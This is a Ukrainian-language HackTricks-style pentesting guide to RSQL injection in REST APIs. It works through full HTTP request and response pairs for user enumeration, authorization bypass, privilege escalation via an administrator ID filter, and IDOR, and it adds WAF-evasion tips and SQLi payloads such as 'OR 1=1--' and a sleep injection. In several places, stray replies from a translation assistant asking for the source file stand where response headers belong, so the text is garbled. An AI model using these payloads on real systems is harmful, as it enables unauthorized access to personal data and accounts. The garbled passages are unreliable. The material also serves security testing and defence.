# RSQL Injection

{{#include ../banners/hacktricks-training.md}}

## Що таке RSQL?
RSQL — це мова запитів, розроблена для параметризованої фільтрації вхідних даних у RESTful APIs. Заснована на FIQL (Feed Item Query Language), спочатку описаній Mark Nottingham для запитів до Atom feeds, RSQL вирізняється простотою та здатністю виражати складні запити компактно і відповідно до URI через HTTP. Це робить її відмінним вибором як загальної мови запитів для пошуку по REST-ендпоінтах.

## Огляд
RSQL Injection — це вразливість у вебзастосунках, які використовують RSQL як мову запитів у RESTful APIs. Подібно до [SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection) та [LDAP Injection](https://owasp.org/www-community/attacks/LDAP_Injection), ця вразливість виникає, коли RSQL-фільтри недостатньо санітизовані, що дозволяє атакуючому вставляти шкідливі запити для отримання доступу, зміни або видалення даних без авторизації.

## Як це працює?
RSQL дозволяє будувати складні запити в RESTful APIs, наприклад:
```bash
/products?filter=price>100;category==electronics
```
Це перетворюється на структурований запит, який фільтрує продукти з ціною більшою за 100 і категорією “електроніка”.

Якщо додаток некоректно перевіряє введення користувача, нападник може змінити фільтр, щоб виконати непередбачувані запити, наприклад:
```bash
/products?filter=id=in=(1,2,3);delete_all==true
```
Або навіть скористатися цим, щоб витягнути конфіденційну інформацію за допомогою булевих запитів або вкладених підзапитів.

## Ризики
- **Exposure of sensitive data:** Зловмисник може отримати інформацію, яка не повинна бути доступною.
- **Data modification or deletion:** Впровадження фільтрів, які змінюють записи в базі даних.
- **Privilege escalation:** Маніпуляція ідентифікаторами, що надають ролі через фільтри, щоб обдурити застосунок, отримавши доступ з привілеями інших користувачів.
- **Evasion of access controls:** Маніпуляція фільтрами для доступу до обмежених даних.
- **Impersonation or IDOR:** Зміна ідентифікаторів між користувачами через фільтри, які дозволяють отримати доступ до інформації та ресурсів інших користувачів без належної автентифікації.

## Підтримувані RSQL оператори
| Оператор  | Опис | Приклад  |
|:----: |:----: |:------------------:|
| `;` / `and` | Логічний оператор **AND**. Фільтрує рядки, де *обидві* умови є *істинними* | `/api/v2/myTable?q=columnA==valueA;columnB==valueB` |
| `,` / `or` | Логічний оператор **OR**. Фільтрує рядки, де *принаймні одна* умова є *істинною*| `/api/v2/myTable?q=columnA==valueA,columnB==valueB` |
| `==` | Виконує запит **рівності**. Повертає всі рядки з *myTable*, де значення в *columnA* точно дорівнюють *queryValue* | `/api/v2/myTable?q=columnA==queryValue` |
| `=q=` | Виконує **пошуковий** запит. Повертає всі рядки з *myTable*, де значення в *columnA* містять *queryValue* | `/api/v2/myTable?q=columnA=q=queryValue` |
| `=like=` | Виконує запит типу **like**. Повертає всі рядки з *myTable*, де значення в *columnA* схожі на *queryValue* | `/api/v2/myTable?q=columnA=like=queryValue` |
| `=in=` | Виконує запит **in**. Повертає всі рядки з *myTable*, де *columnA* містить *valueA* OR *valueB* | `/api/v2/myTable?q=columnA=in=(valueA, valueB)` |
| `=out=` | Виконує **виключний** запит. Повертає всі рядки з *myTable*, де значення в *columnA* не є ні *valueA*, ні *valueB* | `/api/v2/myTable?q=columnA=out=(valueA,valueB)` |
| `!=` | Виконує запит *не рівності*. Повертає всі рядки з *myTable*, де значення в *columnA* не дорівнюють *queryValue* | `/api/v2/myTable?q=columnA!=queryValue` |
| `=notlike=` | Виконує запит **not like**. Повертає всі рядки з *myTable*, де значення в *columnA* не схожі на *queryValue* | `/api/v2/myTable?q=columnA=notlike=queryValue` |
| `<` & `=lt=` | Виконує запит **менше ніж**. Повертає всі рядки з *myTable*, де значення в *columnA* менші за *queryValue* | `/api/v2/myTable?q=columnA<queryValue` <br> `/api/v2/myTable?q=columnA=lt=queryValue` |
| `=le=` & `<=` | Виконує запит **менше або рівне**. Повертає всі рядки з *myTable*, де значення в *columnA* менші за або рівні *queryValue* | `/api/v2/myTable?q=columnA<=queryValue` <br> `/api/v2/myTable?q=columnA=le=queryValue` |
| `>` & `=gt=` | Виконує запит **більше ніж**. Повертає всі рядки з *myTable*, де значення в *columnA* більші за *queryValue* | `/api/v2/myTable?q=columnA>queryValue` <br> `/api/v2/myTable?q=columnA=gt=queryValue` |
| `>=` & `=ge=` | Виконує запит **більше або рівне**. Повертає всі рядки з *myTable*, де значення в *columnA* рівні або більші за *queryValue* | `/api/v2/myTable?q=columnA>=queryValue` <br> `/api/v2/myTable?q=columnA=ge=queryValue` |
| `=rng=` | Виконує запит **діапазон**. Повертає всі рядки з *myTable*, де значення в *columnA* більші або рівні *fromValue* та менші або рівні *toValue* | `/api/v2/myTable?q=columnA=rng=(fromValue,toValue)` |

**Примітка**: Таблиця заснована на інформації з [**MOLGENIS**](https://molgenis.gitbooks.io/molgenis/content/) та [**rsql-parser**](https://github.com/jirutka/rsql-parser) applications.

#### Приклади
- name=="Kill Bill";year=gt=2003
- name=="Kill Bill" and year>2003
- genres=in=(sci-fi,action);(director=='Christopher Nolan',actor==*Bale);year=ge=2000
- genres=in=(sci-fi,action) and (director=='Christopher Nolan' or actor==*Bale) and year>=2000
- director.lastName==Nolan;year=ge=2000;year=lt=2010
- director.lastName==Nolan and year>=2000 and year<2010
- genres=in=(sci-fi,action);genres=out=(romance,animated,horror),director==Que*Tarantino
- genres=in=(sci-fi,action) and genres=out=(romance,animated,horror) or director==Que*Tarantino

**Примітка**: Таблиця заснована на інформації з [**rsql-parser**](https://github.com/jirutka/rsql-parser) application.

## Загальні фільтри
Ці фільтри допомагають уточнити запити в API:

| Фільтр | Опис | Приклад |
|--------|------------|---------|
| `filter[users]` | Фільтрує результати за конкретними користувачами | `/api/v2/myTable?filter[users]=123` |
| `filter[status]` | Фільтрує за статусом (активний/неактивний, завершено тощо) | `/api/v2/orders?filter[status]=active` |
| `filter[date]` | Фільтрує результати в межах діапазону дат | `/api/v2/logs?filter[date]=gte:2024-01-01` |
| `filter[category]` | Фільтрує за категорією або типом ресурсу | `/api/v2/products?filter[category]=electronics` |
| `filter[id]` | Фільтрує за унікальним ідентифікатором | `/api/v2/posts?filter[id]=42` |


## Загальні параметри
Ці параметри допомагають оптимізувати відповіді API:

| Параметр | Опис | Приклад |
|-----------|------------|---------|
| `include` | Включає пов'язані ресурси у відповідь | `/api/v2/orders?include=customer,items` |
| `sort` | Сортує результати у зростаючому або спадному порядку | `/api/v2/users?sort=-created_at` |
| `page[size]` | Керує кількістю результатів на сторінку | `/api/v2/products?page[size]=10` |
| `page[number]` | Вказує номер сторінки | `/api/v2/products?page[number]=2` |
| `fields[resource]` | Визначає, які поля повертати у відповіді | `/api/v2/users?fields[users]=id,name,email` |
| `search` | Виконує більш гнучкий пошук | `/api/v2/posts?search=technology` |

## Витік інформації та перерахування користувачів
Наступний запит показує endpoint реєстрації, який вимагає параметр email для перевірки, чи зареєстрований користувач з цим email, і повертає true або false залежно від того, чи існує він у базі даних:
### Запит
```
GET /api/registrations HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
Будь ласка, вставте вміст файлу src/pentesting-web/rsql-injection.md, щоб я міг його перекласти українською, зберігши оригінальний Markdown/HTML і незміненими шляхи, теги та посилання.
```
HTTP/1.1 400
Date: Sat, 22 Mar 2025 14:47:14 GMT
Content-Type: application/vnd.api+json
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *
Content-Length: 85

{
"errors": [{
"code": "BLANK",
"detail": "Missing required param: email",
"status": "400"
}]
}
```
Хоча очікується `/api/registrations?email=<emailAccount>`, можливо використовувати RSQL фільтри для спроби перерахування та/або вилучення інформації про користувачів за допомогою спеціальних операторів:
### Request
```
GET /api/registrations?filter[userAccounts]=email=='test@test.com' HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Origin: https://locahost:3000
Connection: keep-alive
Referer: https://locahost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
Ви не надали вміст для перекладу. Будь ласка, вставте текст файлу src/pentesting-web/rsql-injection.md або потрібний фрагмент, і я перекладу його українською, зберігаючи markdown/HTML та незмінні елементи.
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 14:09:38 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 38
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"data": {
"attributes": {
"tenants": []
}
}
}
```
У випадку співпадіння дійсного email-акаунта додаток поверне інформацію про користувача замість звичного *“true”*, *"1"* чи чогось подібного у відповіді від сервера:

### Request
```
GET /api/registrations?filter[userAccounts]=email=='manuel**********@domain.local' HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
Будь ласка, надайте вміст файлу src/pentesting-web/rsql-injection.md для перекладу.
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 14:19:46 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 293
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"data": {
"id": "********************",
"type": "UserAccountDTO",
"attributes": {
"id": "********************",
"type": "UserAccountDTO",
"email": "manuel**********@domain.local",
"sub": "*********************",
"status": "ACTIVE",
"tenants": [{
"id": "1"
}]
}
}
}
```
## Authorization evasion
У цьому сценарії ми починаємо з користувача з базовою роллю і не маємо привілейованих дозволів (наприклад, адміністратор) для доступу до списку всіх користувачів, зареєстрованих у базі даних:
### Запит
```
GET /api/users HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Authorization: Bearer eyJhb.................
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
### Відповідь
```
HTTP/1.1 403
Date: Sat, 22 Mar 2025 14:40:07 GMT
Content-Length: 0
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *
```
Знову ми використовуємо фільтри та спеціальні оператори, які дозволяють нам альтернативний спосіб отримати інформацію про користувачів та обійти контроль доступу.
Наприклад, відфільтрувати тих *користувачів*, у чиєму *ID* міститься літера “*a*”:
### Request
```
GET /api/users?filter[users]=id=in=(*a*) HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Authorization: Bearer eyJhb.................
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
Я не бачу вмісту файлу. Будь ласка, вставте вміст src/pentesting-web/rsql-injection.md або вкажіть фрагмент, який потрібно перекласти.
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 14:43:28 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 1434192
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"data": [{
"id": "********A***********",
"type": "UserGetResponseCustomDTO",
"attributes": {
"status": "ACTIVE",
"countryId": 63,
"timeZoneId": 3,
"translationKey": "************",
"email": "**********@domain.local",
"firstName": "rafael",
"surname": "************",
"telephoneCountryCode": "**",
"mobilePhone": "*********",
"taxIdentifier": "********",
"languageId": 1,
"createdAt": "2024-08-09T10:57:41.237Z",
"termsOfUseAccepted": true,
"id": "******************",
"type": "UserGetResponseCustomDTO"
}
}, {
"id": "*A*******A*****A*******A******",
"type": "UserGetResponseCustomDTO",
"attributes": {
"status": "ACTIVE",
"countryId": 63,
"timeZoneId": 3,
"translationKey": ""************",
"email": "juan*******@domain.local",
"firstName": "juan",
"surname": ""************",",
"telephoneCountryCode": "**",
"mobilePhone": "************",
"taxIdentifier": "************",
"languageId": 1,
"createdAt": "2024-07-18T06:07:37.68Z",
"termsOfUseAccepted": true,
"id": "*******************",
"type": "UserGetResponseCustomDTO"
}
}, {
................
```
## Privilege Escalation
Дуже ймовірно знайти певні endpoints, які перевіряють привілеї користувача за його роллю. Наприклад, ми маємо справу з користувачем, який не має привілеїв:
### Запит
```
GET /api/companyUsers?include=role HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Authorization: Bearer eyJhb......
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
### Response
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 19:13:08 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 11
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"data": []
}
```
Використовуючи певні оператори, ми могли перерахувати адміністраторів:
### Запит
```
GET /api/companyUsers?include=role&filter[companyUsers]=user.id=='94****************************' HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Authorization: Bearer eyJh.....
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
### Відповідь
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 19:13:45 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 361
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"data": [{
"type": "CompanyUserGetResponseDTO",
"attributes": {
"companyId": "FA**************",
"companyTaxIdentifier": "B999*******",
"bizName": "company sl",
"email": "jose*******@domain.local",
"userRole": {
"userRoleId": 1,
"userRoleKey": "general.roles.admin"
},
"companyCountryTranslationKey": "*******",
"type": "CompanyUserGetResponseDTO"
}
}]
}
```
Після того, як стане відомий ідентифікатор користувача-адміністратора, можна експлуатувати privilege escalation, замінивши або додавши відповідний фільтр із ідентифікатором адміністратора та отримавши ті самі привілеї:
### Запит
```
GET /api/functionalities/allPermissionsFunctionalities?filter[companyUsers]=user.id=='94****************************' HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Authorization: Bearer eyJ.....
Origin: https:/localhost:3000
Connection: keep-alive
Referer: https:/localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
### Response
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 18:53:00 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 68833
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"meta": {
"Functionalities": [{
"functionalityId": 1,
"permissionId": 1,
"effectivePriority": "PERMIT",
"effectiveBehavior": "PERMIT",
"translationKey": "general.userProfile",
"type": "FunctionalityPermissionDTO"
}, {
"functionalityId": 2,
"permissionId": 2,
"effectivePriority": "PERMIT",
"effectiveBehavior": "PERMIT",
"translationKey": "general.my_profile",
"type": "FunctionalityPermissionDTO"
}, {
"functionalityId": 3,
"permissionId": 3,
"effectivePriority": "PERMIT",
"effectiveBehavior": "PERMIT",
"translationKey": "layout.change_user_data",
"type": "FunctionalityPermissionDTO"
}, {
"functionalityId": 4,
"permissionId": 4,
"effectivePriority": "PERMIT",
"effectiveBehavior": "PERMIT",
"translationKey": "general.configuration",
"type": "FunctionalityPermissionDTO"
}, {
....
}]
}
}
```
## Impersonate or Insecure Direct Object References (IDOR)
На додаток до використання параметра `filter`, можна використовувати інші параметри, такі як `include`, який дозволяє включати у результат певні поля (наприклад language, country, password...).

У наступному прикладі показано інформацію нашого профілю користувача:
### Request
```
GET /api/users?include=language,country HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Authorization: Bearer eyJ...
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
### Відповідь
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 19:47:27 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 540
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"data": [{
"id": "D5********************",
"type": "UserGetResponseCustomDTO",
"attributes": {
"status": "ACTIVE",
"countryId": 63,
"timeZoneId": 3,
"translationKey": "**********",
"email": "domingo....@domain.local",
"firstName": "Domingo",
"surname": "**********",
"telephoneCountryCode": "**",
"mobilePhone": "******",
"languageId": 1,
"createdAt": "2024-03-11T07:24:57.627Z",
"termsOfUseAccepted": true,
"howMeetUs": "**************",
"id": "D5********************",
"type": "UserGetResponseCustomDTO"
}
}]
}
```
Комбінація фільтрів може використовуватися для обходу контролю авторизації та отримання доступу до профілів інших користувачів:
### Request
```
GET /api/users?include=language,country&filter[users]=id=='94***************' HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Authorization: Bearer eyJ...
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
### Відповідь
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 19:50:07 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 520
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"data": [{
"id": "94******************",
"type": "UserGetResponseCustomDTO",
"attributes": {
"status": "ACTIVE",
"countryId": 63,
"timeZoneId": 2,
"translationKey": "**************",
"email": "jose******@domain.local",
"firstName": "jose",
"surname": "***************",
"telephoneCountryCode": "**",
"mobilePhone": "********",
"taxIdentifier": "*********",
"languageId": 1,
"createdAt": "2024-11-21T08:29:05.833Z",
"termsOfUseAccepted": true,
"id": "94******************",
"type": "UserGetResponseCustomDTO"
}
}]
}
```
## Виявлення та fuzzing — швидкі поради
- Перевірте підтримку RSQL, відправляючи нешкідливі проби, такі як `?filter=id==test`, `?q==test` або некоректні оператори `=foo=`; детальні API часто leak повідомлення парсера ("Unknown operator" / "Unknown property").
- Багато реалізацій двічі парсять URL-параметри; спробуйте подвійне кодування `(`, `)`, `*`, `;` (наприклад, `%2528admin%2529`) щоб обійти наївні blocklists та WAFs.
- Boolean exfil з підстановками: `filter[users]=email==*%@example.com;status==ACTIVE` і змінюйте логіку за допомогою `,` (OR), щоб порівняти розміри відповідей.
- Range/proximity leaks: `filter[users]=createdAt=rng=(2024-01-01,2025-01-01)` швидко перелічує записи за роками без знання точних ID.

## Зловживання для конкретних фреймворків (Elide / JPA Specification / JSON:API)
- Elide і багато проектів Spring Data REST переводять RSQL прямо в JPA Criteria. Коли розробники додають кастомні оператори (наприклад, `=ilike=`) і будують предикати через конкатенацію рядків замість параметризованих запитів, можна перейти на SQLi (класичний payload: `name=ilike='%%' OR 1=1--'`).
- Elide analytic data store приймає параметризовані колонки; поєднання параметрів аналітики під контролем користувача з RSQL-фільтрами було коренем SQLi в CVE-2022-24827. Навіть якщо виправлені версії правильно параметризують, подібний кастомний код часто залишається — шукайте SpEL-вирази `@JoinFilter`/`@ReadPermission`, що містять `${}`, і пробуйте інжектити `';sleep(5);'` або логічні тавтології.
- Бекенди JSON:API зазвичай експонують одночасно `include` та `filter`. Фільтрація по пов'язаних ресурсах `filter[orders]=customer.email==*admin*` може обійти верхньорівневі ACL, бо фільтри на рівні зв'язків виконуються перед перевіркою власності.

## Помічники для автоматизації
- **rsql-parser CLI (Java)**: `java -jar rsql-parser.jar "name=='*admin*';status==ACTIVE"` валідовує payloads локально і показує абстрактне синтаксичне дерево — корисно для підбору збалансованих дужок та кастомних операторів.
- **Швидкий генератор на Python**:
```python
from pyrsql import RSQL
payload = RSQL().and_("email==*admin*", "status==ACTIVE").or_("role=in=(owner,admin)")
print(str(payload))
```
- Поєднуйте з HTTP fuzzer (ffuf, turbo-intruder), ітеративно перебираючи позиції символів підстановки `*a*`, `*e*` тощо всередині списків `=in=`, щоб швидко перерахувати ID та електронні адреси.

## References
- [RSQL Injection](https://owasp.org/www-community/attacks/RSQL_Injection)
- [RSQL Injection Exploitation](https://m3n0sd0n4ld.github.io/patoHackventuras/rsql_injection_exploitation)
- [Elide filtering & security considerations](https://elide.io/pages/guide/03-analytics.html)

{{#include ../banners/hacktricks-training.md}}
